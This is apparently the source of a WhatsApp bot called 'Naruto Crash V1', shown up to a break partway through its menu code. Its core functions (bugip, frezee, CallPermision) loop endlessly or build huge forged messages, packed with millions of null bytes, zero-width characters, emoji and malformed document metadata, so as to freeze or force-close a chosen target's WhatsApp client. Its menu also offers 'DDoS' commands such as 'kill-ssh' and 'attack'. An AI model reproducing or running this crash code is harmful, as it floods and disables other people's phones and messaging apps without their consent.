require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require("crypto");
const kripto = require('crypto');
const chalk = require("chalk");
const { Client } = require('ssh2');
const { mediafire } = require('./lib/scrape-mediafire');
const util = require("util");
const tdxlol = fs.readFileSync('./lib/tdx.jpeg')
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
let processList = [];
const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = X = async (X, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? X.user.id.split(":")[0] || X.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
const premium = JSON. parse(fs.readFileSync('./lib/database/premium.json'));
const botNumber = await X.decodeJid(X.user.id);
const isBot = botNumber.includes(senderNumber)
const isOwner = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPrem = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await X.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
    const separator = chalk.hex("#3498db").bold("═".repeat(40));
    const title = chalk.bgHex("#8e44ad").white.bold(" 🚀 Naruto Crash V1");

    console.log(`\n${separator}`);
    console.log(title);
    console.log(separator);

    console.log(
        chalk.hex("#2ecc71").bold(`
        🗓️  Tanggal       : ${chalk.hex("#f1c40f")(new Date().toLocaleString())}
        ✉️  Pesan         : ${chalk.hex("#e74c3c")(m.body || m.mtype)}
        👤  Pengirim      : ${chalk.hex("#1abc9c")(m.pushname || "Tidak Diketahui")}
        📞  JID           : ${chalk.hex("#3498db")(senderNumber || "Tidak Diketahui")}
        `)
    );

    if (m.isGroup) {
        console.log(
            chalk.hex("#e67e22").bold(`
        👥  Grup          : ${chalk.hex("#e74c3c")(groupName || "Tidak Diketahui")}
        🆔  GroupJid      : ${chalk.hex("#9b59b6")(m.chat || "Tidak Diketahui")}
        `)
        );
    }

    console.log(separator);
    console.log(chalk.bgHex("#c0392b").white.bold("Naruto Crash V1").padStart(30, " "));
    console.log(`${separator}\n`);
}
let cooldowns = {}; 
let cooldownTime = 5 * 60 * 1000; 
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
function getFileTypeFromUrl(url) {
    const parts = url.split('.');
    return parts[parts.length - 1];
}    
//++++++++++𝕱𝖀𝕹𝕮𝕿𝕴𝕺𝕹 𝕭𝖀𝕲 1++++++++++//
async function bugip(target) {
    let count = 0;
    while (true) {
        count++;
        await X.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: `@Naruto Crash • #𝗕𝗨𝗚-𝗦𝗧𝗨𝗖𝗞 🔥 (${count})`,
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(3000000),
                            version: 9999
                        }
                    }
                }
            }
        }, { participant: { jid: target }});
        await new Promise(resolve => setTimeout(resolve, 100)); 
    }
}
//++++++++++𝕱𝖀𝕹𝕮𝕿𝕴𝕺𝕹 𝕭𝖀𝕲 1++++++++++//
async function frezee(target) {
    let longText = "🔥".repeat(500000);
    let zeroWidth = "\u200B".repeat(5000000);
    let markdownBug = "*".repeat(1000000);
    let mentions = Array(5000).fill("@everyone").join(" ");
    let emojiSpam = "💀🔥😈".repeat(500000);

    let comboText = `${longText}\n${zeroWidth}\n${markdownBug}\n${mentions}\n${emojiSpam}`;
    
    while (true) {
        await X.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: comboText, // Kombinasi semua exploit
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(10000000), // Payload besar
                            version: 9999999
                        }
                    }
                }
            }
        }, { participant: { jid: target }});

        await X.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        caption: emojiSpam,
                        jpegThumbnail: Buffer.alloc(1)
                    }
                }
            }
        }, { participant: { jid: target }});
    }
}
//++++++++++𝕱𝖀𝕹𝕮𝕿𝕴𝕺𝕹 𝕭𝖀𝕲 1++++++++++//
async function CallPermision(target) {
                   let {
                           generateWAMessageFromContent,
                           proto
                   } = require("@whiskeysockets/baileys")
                   let sections = [];
                   for (let i = 0; i < 100000; i++) {
                           let ThunderVarious = {
                                   title: `Thunder Avalible Strom \"🐉\" ${i}`,
                                   highlight_label: `𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫 ${i}`,
                                   rows: [{
                                           title: "𝗧𝗿𝗮𝘀𝗵𝗧𝗵𝘂𝗻𝗱𝗲𝗿🪐",
                                           id: `id${i}`,
                                           subrows: [{
                                                   title: "𝗧𝗿𝗮𝘀𝗵𝗧𝗵𝘂𝗻𝗱𝗲𝗿🏷️",
                                                   id: `nested_id1_${i}`,
                                                   subsubrows: [{
                                                           title: "𝗧𝗿𝗮𝘀𝗵𝗙𝗹𝗼𝗮𝘁𝗶𝗻𝗴 -- ©𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫",
                                                           id: `deep_nested_id1_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝗡𝗲𝘀𝘁𝗶𝗴𝗿𝗶𝗹𝘀𝗧𝗿𝗮𝘀𝗵🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }],
                                           }, {
                                                   title: "𝗧𝗙𝗢𝗧𝗿𝗮𝘀𝗵〽️",
                                                   id: `nested_id2_${i}`,
                                           }, ],
                                   }, ],
                           };
                           let ButtonOverFlow = {
                                   buttonsMessage: {
                                           documentMessage: {
                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                   fileLength: "9999999999999",
                                                   pageCount: 3567587327,
                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                   fileName: "\u0000",
                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                   mediaKeyTimestamp: "1735456100",
                                                   contactVcard: true,
                                                   caption: ""
                                           },
                                           contentText: "🐉 - Xyro Thunder",
                                           footerText: "© 𝐒𝐢𝐫𝐨 𝐄𝐬𝐂𝐚𝐧𝐨𝐫",
                                           buttons: [{
                                                   buttonId: `${i}`,
                                                   buttonText: {
                                                           displayText: "🐉-------Trash Over Flowed"
                                                   },
                                                   type: 1
                                           }],
                                           headerType: 2
                                   }
                           }
                           let TrashDex = {
                                   title: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                   highlight_label: `〽️ ${i}️`,
                                   rows: [{
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "ᨒ",
                                           id: `.allmenu ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝️🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫͢𝐚͠𝐬𝐡 𝐎𝐯͠𝐞𝐫͢𝐅𝐥͓𝐨𝐰͠𝐞𝐝🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }]
                           }
                           sections.push(ThunderVarious, TrashDex, ButtonOverFlow);
                   }
                   let listMessage = {
                           title: "𝐒͢𝐢𝐫͠𝐨 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️",
                           sections: sections,
                   };
                   let msg = generateWAMessageFromContent(target, {
                           viewOnceMessage: {
                                   message: {
                                           messageContextInfo: {
                                                   deviceListMetadata: {},
                                                   deviceListMetadataVersion: 2,
                                           },
                                           interactiveMessage: proto.Message.InteractiveMessage.create({
                                                   contextInfo: {
                                                           mentionedJid: [],
                                                           isForwarded: true,
                                                           forwardingScore: 999,
                                                           businessMessageForwardInfo: {
                                                                   businessOwnerJid: target,
                                                           },
                                                   },
                                                   body: proto.Message.InteractiveMessage.Body.create({
                                                           text: "\u0000",
                                                   }),
                                                   footer: proto.Message.InteractiveMessage.Footer.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                   }),
                                                   header: proto.Message.InteractiveMessage.Header.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                           subtitle: "Testing Immediate Force Close",
                                                           hasMediaAttachment: false,
                                                   }),
                                                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                                           buttons: [{
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "payment_method",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }],
                                                   }),
                                           }),
                                   },
                           },
                   }, {
                           userJid: target
                   });
                   await X.relayMessage(target, msg.message, {
                           participant: {
                                   jid: target,
                           },
                   });
                   console.log("Trash Ui🐉");
           }    
// Helper functions
async function replygw(teks) {
const nedd = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `${global.nmbot}`,
newsletterJid: global.idSaluran + "@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: `Brayen Official 🕊`,
body: `Naruto Crash`,
previewType: "VIDEO",
thumbnailUrl: 'https://files.catbox.moe/zlw9kj.jpg', 
sourceUrl: global.url,  
},
},
text: teks,
};
return X.sendMessage(m.chat, nedd, {quoted: fkontak,});
}
const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": `υρтιмє : ${runtime(process.uptime())}`,
                    "jpegThumbnail": ''
                          }
                        }
                      } 
const reaction = async (jidss, emoji) => {
X.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': {
 const emojis = ['🎭', '🎰', '✅'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await X.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
𐙚 *_Olaa ${pushname} Introduce me_* *_${global.p}Naruto Crash${global.p}_* , *_I was created by Brayen Official 🕊, use me wisely and responsibly!!_*
━━━━━━━━━━━━━━━━━━━━━
*_안 쿠이엑스슈퍼_* 🐉
`;

     let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝕺𝖜𝖓𝖊𝖗"} },
       { buttonId: ".allmenu", buttonText: { displayText: "𝕬𝖑𝖑𝕸𝖊𝖓𝖚" } }
     ];

     let buttonMessage = {
       video: {
         url: 'https://files.catbox.moe/cqoiif.mp4' 
       },
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: '𐙚 Brayen Official 🕊',
           body: 'Naruto Crash',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'Brayen Official 🕊',
           serverMessageId: -1
         }
       },
       footer: "Naruto Crash",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝕺𝖕𝖊𝖓𝕿𝖔𝕸𝖊𝖓𝖚",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "Brayen Official 🕊",
                 rows: [
                   { title: "🐔", description: "𝕺𝖕𝖊𝖓 𝕿𝖔 𝕭𝖚𝖌", id: ".xcrash" },
                   { title: "🎰", description: "𝕺𝖕𝖊𝖓 𝕿𝖔 𝕴𝖜𝖓𝖊𝖗", id: ".owner" }                  
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await X.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;

case 'allmenu': {
 const emojis = ['🎭', '🎰', '✅'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await X.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
「 𝕭𝖚𝖌 𝕸𝖊𝖓𝖚 」
. xᴄʀᴀsʜ 
. ғɪxʙᴜɢ

「 𝕯𝖉𝖔𝖘 𝕸𝖊𝖓𝖚 」
. ᴋɪʟʟ-ssʜ
. ᴀᴛᴛᴀᴄᴋ

「 𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚 」
. ᴘᴜʙʟɪᴄ
. sᴇʟғ
. ᴀᴅᴅᴍᴜʀʙᴜɢ
. ᴅᴇʟᴍᴜʀʙᴜɢ
. ᴀᴅᴅᴏᴡɴᴇʀ
. ᴅᴇʟᴏᴡɴᴇʀ

「 𝕲𝖗𝖔𝖚𝖕 𝕸𝖊𝖓𝖚 」
. ᴋᴜᴅᴇᴛᴀ
. ᴀᴅᴅ
. ᴋɪᴄᴋ
. ᴅᴇᴍᴏᴛᴇ
. ᴘʀᴏᴍᴏᴛᴇ

「 𝕿𝖔𝖔𝖑𝖘 𝕸𝖊𝖓𝖚 」
. ᴛᴏʜᴅ
. ʀᴠᴏ
. ᴛᴏᴜʀʟ
━━━━━━━━━━━━━━━━━━━━━
*_안 쿠이엑스슈퍼_* 🐉
`;

     let buttons = [
       { buttonId: ".owner", buttonText: { displayText: "𝕺𝖜𝖓𝖊𝖗"} },
       { buttonId: ".allmenu", buttonText: { displayText: "𝕬𝖑𝖑𝕸𝖊𝖓𝖚" } }
     ];

     let buttonMessage = {
       video: {
         url: 'https://files.catbox.moe/cqoiif.mp4' 
       },
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: '𐙚 Brayen Official 🕊',
           body: 'Naruto Crash',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'Brayen Official 🕊',
           serverMessageId: -1
         }
       },
       footer: "Naruto Crash",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };

     const flowActions = [
       {
         buttonId: 'action',
         buttonText: { displayText: 'This Button List' },
         type: 4,
         nativeFlowInfo: {
           name: 'single_select',
           paramsJson: JSON.stringify({
             title: "𝕺𝖕𝖊𝖓𝕿𝖔𝕸𝖊𝖓𝖚",
             sections: [
               {
                 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                 highlight_label: "Brayen Official 🕊",
                 rows: [
                   { title: "🐔", description: "𝕺𝖕𝖊𝖓 𝕿𝖔 𝕭𝖚𝖌", id: ".xcrash" },
